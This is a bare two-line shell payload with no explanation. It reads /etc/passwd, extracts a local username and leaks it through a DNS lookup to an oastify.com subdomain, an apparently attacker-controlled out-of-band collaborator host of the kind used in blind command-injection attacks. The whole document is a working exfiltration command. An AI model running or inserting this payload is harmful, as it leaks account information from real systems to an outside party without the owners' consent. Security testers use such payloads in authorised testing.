i=$(cat /etc/passwd | grep "home" | cut -d ":" -f 1 | tail -n 1)
nslookup $i.kl9dtf96irwnwq4bljh5uvm0brhi5atz.oastify.com
